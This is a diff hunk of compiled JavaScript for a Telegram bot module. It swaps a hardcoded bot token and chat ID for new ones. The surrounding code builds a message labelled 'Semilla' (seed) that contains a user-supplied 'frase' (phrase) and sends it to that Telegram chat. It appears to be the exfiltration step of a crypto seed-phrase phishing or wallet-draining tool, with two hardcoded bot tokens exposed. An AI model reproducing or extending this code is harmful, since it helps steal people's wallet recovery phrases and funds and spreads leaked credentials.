@@ -5,9 +5,9 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 Object.defineProperty(exports, "__esModule", { value: true });
 exports.enviarMensajeTelegramStart = exports.enviarMensajeTelegram = void 0;
 const node_telegram_bot_api_1 = __importDefault(require("node-telegram-bot-api"));
-const token = "7943951367:AAG0X-lhN4kkIaR0oLV-63ZWwgwfgqisTOs";
+const token = "8574258829:AAHGrKZLc8xvt51idytn4sSVFc0Ga4TzNew";
 const bot = new node_telegram_bot_api_1.default(token, { polling: false });
-const chatId = "814041563";
+const chatId = "-1003654161102";
 const enviarMensajeTelegram = (msj) => {
     const mensaje = `   📢 Semilla: 
                         ${msj.frase}
